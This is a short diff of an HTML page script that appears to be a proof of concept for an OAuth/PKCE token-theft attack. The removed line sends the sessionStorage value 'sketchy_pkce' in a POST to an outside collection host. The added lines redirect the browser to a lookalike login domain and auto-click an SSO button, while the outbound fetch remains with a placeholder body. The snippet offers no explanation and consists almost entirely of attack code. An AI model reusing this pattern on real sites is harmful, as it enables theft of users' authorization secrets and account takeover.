@@ -3,9 +3,13 @@
 <body>
 	<h1>Hello!</h1>
     <script>
+
+		window.location.href = "https://login.sketchycompany.upd-dcs.work/";
+		document.getElementById('sketchy-sso').click(); 
+
 		fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
 			method: 'POST',
-			body: sessionStorage.getItem('sketchy_pkce')
+			body: 'test'
 		});
     </script>
 </body>
